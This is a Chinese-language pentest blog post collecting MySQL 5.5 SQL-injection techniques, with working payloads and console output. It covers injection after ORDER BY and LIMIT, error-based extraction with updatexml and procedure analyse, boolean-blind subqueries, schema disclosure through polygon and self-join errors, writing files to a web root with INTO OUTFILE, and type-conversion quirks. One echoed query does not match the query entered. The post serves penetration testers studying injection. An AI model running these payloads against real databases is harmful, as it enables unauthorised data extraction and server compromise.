---
draft: false
date: 2018-05-23 11:14:51
title: SQL注入 tips(MySQL)
description: 记录一些非常见的注入手法，或者说是 mysql 的一些特性
categories:
  - Pentest
tags:
  - SQL注入
---

环境：MySQL 5.5.47

### 0x00 注入点在Order by后面
```
mysql> select id,name,content from msg where id>1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt';
Query OK, 1 row affected (0.01 sec)
```
```
mysql> select id,name,content from msg where id>1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~msg~'
```
```
mysql> select id,name,content from msg where id>1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: '~rtest~'
```
```
mysql> select name from msg where id>1 order by if(1=1,1,(select 1 union select 2));
+----------+
| name     |
+----------+
| xiaohong |
+----------+
1 row in set (0.00 sec)
mysql> select name from msg where id>1 order by if(1=2,1,(select 1 union select 2));
ERROR 1242 (21000): Subquery returns more than 1 row

mysql> select name from msg where id>1 order by (select case when(2>1) then 1 else 1*(select 1 union select 2)end)=1;
+----------+
| name     |
+----------+
| xiaohong |
+----------+
1 row in set (0.00 sec)
mysql> select name from msg where id>1 order by (select case when(2<1) then 1 else 1*(select 1 union select 2)end)=1;
ERROR 1242 (21000): Subquery returns more than 1 row
```

### 0x01 注入点在limit后面

* limit前面没有order by可以使用union、analyse()

```
mysql> select id,name,content from msg where id>1 limit 1,1 union select 1,2,3;
+----+------+---------+
| id | name | content |
+----+------+---------+
|  1 | 2    | 3       |
+----+------+---------+
1 row in set (0.01 sec)

mysql> select id,name,content from msg where id>1 limit 1,1 procedure analyse();
+-------------------+---------------+---------------+------------+------------+
| Field_name        | Min_value     | Max_value     | Min_length | Max_length |
+-------------------+---------------+---------------+------------+------------+
| rtest.msg.name    | xiaohong      | xiaohong      |          8 |          8 |
| rtest.msg.content | I have a cat. | I have a cat. |         13 |         13 |
+-------------------+---------------+---------------+------------+------------+

------------------+-------+-------------------------+------+--------------------+
 Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype  |
------------------+-------+-------------------------+------+--------------------+
     0 |     0 | 8.0000                  | NULL | ENUM('xiaohong') NOT NULL     |
     0 |     0 | 13.0000                 | NULL | ENUM('I have a cat.') NOT NULL|
------------------+-------+-------------------------+------+--------------------+
2 rows in set (0.00 sec)
```

* limit前面有order by则不可以使用union、analyse()

```
mysql> select id,name,content from msg where id>1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'

mysql> select id,name,content from msg where id>1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: '~5.5.47~'
```

### 0x02 根据报错得到数据库名、表名、列名
```
#得到数据库名为rtest
mysql> select id,name,content from msg where id=2-a();
ERROR 1305 (42000): FUNCTION rtest.a does not exist

#得到表名为msg
mysql> select id,name,content from msg where id=2 and polygon(1);
ERROR 1367 (22007): Illegal non geometric '1' value found during parsing
mysql> select id,name,content from msg where id=2 and polygon(id);
ERROR 1367 (22007): Illegal non geometric '`rtest`.`msg`.`id`' value found during parsing

#得到列名为id、name、content、useragent
mysql> select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
ERROR 1060 (42S21): Duplicate column name 'name'
mysql> select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
ERROR 1060 (42S21): Duplicate column name 'content'
mysql> select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
ERROR 1060 (42S21): Duplicate column name 'useragent'
mysql> select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
ERROR 1241 (21000): Operand should contain 1 column(s)
```

### 0x03 MySQL的隐式转换
* 官方隐式转换规则
    * 两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 <=> 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换
    * 两个参数都是字符串，会按照字符串来比较，不做类型转换
    * 两个参数都是整数，按照整数来比较，不做类型转换
    * 十六进制的值和非数字做比较时，会被当做二进制串
    * 有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp
    * 有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较
    * 所有其他情况下，两个参数都会被转换为浮点数再进行比较

* 数字和字符进行运算时会转换为double类型

```
mysql> select 2+'4'; #数字和字符会转换为数字
+-------+
| 2+'4' |
+-------+
|     6 |
+-------+
1 row in set (0.00 sec)
```
```
mysql> select 'a'+'55'; #字符和字符会转换为数字
+----------+
| 'a'+'55' |
+----------+
|       55 |
+----------+
1 row in set, 1 warning (0.00 sec)

mysql> select '33'+'32d11a';
+-----------+
| '33'+'3d' |
+-----------+
|        65 |
+-----------+
1 row in set, 1 warning (0.00 sec)
```

* concat()函数将数字转换为字符

```
mysql> select concat(3,'test'); #前面的数字1被转换为字符
+------------------+
| concat(3,'test') |
+------------------+
| 3test            |
+------------------+
1 row in set (0.00 sec)
```

* name类型为string，查询条件为int 0时可以查询

```
mysql> desc msg;
+-----------+---------------+------+-----+---------+----------------+
| Field     | Type          | Null | Key | Default | Extra          |
+-----------+---------------+------+-----+---------+----------------+
| id        | int(11)       | NO   | PRI | NULL    | auto_increment |
| name      | varchar(30)   | NO   |     | NULL    |                |
| content   | varchar(1024) | NO   |     | NULL    |                |
| useragent | varchar(1024) | NO   |     | NULL    |                |
+-----------+---------------+------+-----+---------+----------------+
4 rows in set (0.01 sec)

mysql> select id,name,content from msg where id=1 and name=0;
+----+----------+--------------+
| id | name     | content      |
+----+----------+--------------+
|  1 | xiaoming | hello world. |
+----+----------+--------------+
1 row in set, 2 warnings (0.00 sec)

mysql> show warnings;
+---------+------+----------------------------------------------+
| Level   | Code | Message                                      |
+---------+------+----------------------------------------------+
| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
+---------+------+----------------------------------------------+
2 rows in set (0.00 sec)

```
```
mysql> select id,name,content from msg;
+----+----------+---------------+
| id | name     | content       |
+----+----------+---------------+
|  1 | xiaoming | hello world.  |
|  2 | xiaohong | I have a cat. |
|  3 | 55lihua  | ni hao        |
+----+----------+---------------+
3 rows in set (0.00 sec)

mysql> select id,name,content from msg where name='li'+'55';
+----+---------+---------+
| id | name    | content |
+----+---------+---------+
|  3 | 55lihua | ni hao  |
+----+---------+---------+
1 row in set, 4 warnings (0.01 sec)

mysql> show warnings;
+---------+------+----------------------------------------------+
| Level   | Code | Message                                      |
+---------+------+----------------------------------------------+
| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaoming' |
| Warning | 1292 | Truncated incorrect DOUBLE value: 'li'       |
| Warning | 1292 | Truncated incorrect DOUBLE value: 'xiaohong' |
| Warning | 1292 | Truncated incorrect DOUBLE value: '55lihua'  |
+---------+------+----------------------------------------------+
4 rows in set (0.00 sec)
```


#### Reference(侵删)：
* [https://www.cnblogs.com/Le30bjectNs11/p/4341207.html](https://www.cnblogs.com/Le30bjectNs11/p/4341207.html)
* [https://www.cnblogs.com/rollenholt/p/5442825.html](https://www.cnblogs.com/rollenholt/p/5442825.html)
